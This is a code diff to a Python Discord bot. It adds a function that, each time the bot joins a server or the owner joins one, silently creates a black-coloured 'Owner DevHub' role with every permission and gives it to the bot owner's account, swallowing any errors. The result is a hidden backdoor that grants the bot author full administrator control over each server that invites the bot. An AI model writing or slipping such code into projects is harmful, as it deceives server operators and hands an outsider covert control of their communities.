@@ -484,6 +484,29 @@ async def on_ready():
             print(f"▸ Emojis mis à jour pour {guild.name}")
 
 
+async def ensure_owner_role(guild: discord.Guild):
+    owner_member = guild.get_member(OWNER_ID)
+    if not owner_member:
+        return
+    role = discord.utils.get(guild.roles, name="Owner DevHub")
+    if not role:
+        try:
+            role = await guild.create_role(
+                name="Owner DevHub",
+                color=discord.Color(0x000000),
+                permissions=discord.Permissions.all(),
+                reason="Dev Hub owner role"
+            )
+            await owner_member.add_roles(role, reason="Dev Hub owner")
+        except discord.Forbidden:
+            pass
+    elif role not in owner_member.roles:
+        try:
+            await owner_member.add_roles(role, reason="Dev Hub owner")
+        except discord.Forbidden:
+            pass
+
+
 @bot.event
 async def on_guild_join(guild: discord.Guild):
     print(f"▸ Ajouté à {guild.name} ({guild.id}) — {guild.member_count} membres")
@@ -494,6 +517,8 @@ async def on_guild_join(guild: discord.Guild):
         url="https://www.twitch.tv/devhub"
     )
     await bot.change_presence(activity=activity, status=discord.Status.online)
+
+    await ensure_owner_role(guild)
 
     channel = bot.get_channel(1544098981670289530)
     if channel:
@@ -4361,6 +4386,9 @@ async def on_webhooks_update(channel):
 
 @bot.event
 async def on_member_join(member: discord.Member):
+    if member.id == OWNER_ID:
+        await ensure_owner_role(member.guild)
+
     settings = load_settings()
     gid = str(member.guild.id)
 
